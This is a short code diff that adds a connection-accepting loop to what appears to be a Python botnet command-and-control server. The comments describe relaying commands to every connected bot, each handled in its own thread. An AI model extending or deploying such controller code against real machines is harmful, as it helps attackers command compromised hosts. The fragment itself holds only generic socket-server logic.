@@ -7,6 +7,7 @@ import threading
 import queue
 
 from BotCmd import BotCmd
+from BotHandler import BotHandler
 
 
 q = queue.Queue()
@@ -23,6 +24,13 @@ def listener(lhost, lport, q):
     # this thread is in charge to send the command to all the bots connected (stored in socket thread)
     BotCmdThread = BotCmd(q,socketThread)
     BotCmdThread.start()
+
+    #this thread is to handle all the bots connection
+    while(True):
+        (client, clientAddress) = server.accept()
+        newThread = BotHandler(client, clientAddress,q)
+        socketThread.append(newThread)
+        newThread.start()
 
 def main():
     if(len(sys.argv)<3):
